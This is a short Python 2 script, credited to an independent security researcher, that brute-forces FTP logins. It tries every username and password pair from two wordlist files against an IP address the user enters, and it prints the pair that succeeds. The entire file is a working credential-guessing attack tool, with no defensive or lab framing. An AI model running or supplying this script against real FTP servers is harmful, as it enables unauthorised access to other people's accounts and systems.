__author__ = "Santhosh Baswa"
__copyright__ = "Copyright 2016, Independent Security Researcher"

import ftplib
import sys

def brute(ip,users_file,passwords_file):
	try:
		ud=open(users_file,"r")
		pd=open(passwords_file,"r")
		
		users= ud.readlines()
		passwords=pd.readlines()

		for user in users:
			for password in passwords:
				try:
					print "[*] Trying to connect"
					connect=ftplib.FTP(ip)
					response=connect.login(user,password)
					print response
					if "230 Login" in response:
						print "[*]Sucessful attack"
						print "User: "+ user + "Password: "+password
						sys.exit()
					else:
						pass
				except ftplib.error_perm:
					print "Cant Brute Force with user "+user+ "and password "+password
					connect.close

	except(KeyboardInterrupt):
		print "Interrupted!"
		sys.exit()

ip=raw_input("Introduce IP:")
user_file="users.txt"
passwords_file="passwords.txt"
brute(ip,user_file,passwords_file)

